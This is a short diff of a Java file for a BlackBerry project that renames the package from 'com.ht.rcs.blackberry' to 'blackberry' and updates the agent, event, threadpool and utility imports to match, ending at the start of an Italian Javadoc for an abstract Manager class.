@@ -6,18 +6,18 @@
  * Created      : 26-mar-2010
  * *************************************************/
 
-package com.ht.rcs.blackberry;
+package blackberry;
 
 import java.util.Vector;
 import java.util.Timer;
 
-import com.ht.rcs.blackberry.agent.Agent;
-import com.ht.rcs.blackberry.event.Event;
-import com.ht.rcs.blackberry.threadpool.TimerJob;
-import com.ht.rcs.blackberry.utils.Check;
-import com.ht.rcs.blackberry.utils.Debug;
-import com.ht.rcs.blackberry.utils.DebugLevel;
-import com.ht.rcs.blackberry.utils.Utils;
+import blackberry.agent.Agent;
+import blackberry.event.Event;
+import blackberry.threadpool.TimerJob;
+import blackberry.utils.Check;
+import blackberry.utils.Debug;
+import blackberry.utils.DebugLevel;
+import blackberry.utils.Utils;
 
 /**
  * The Class Manager. Classe astratta che racchiude le funzionalita' di Manager,
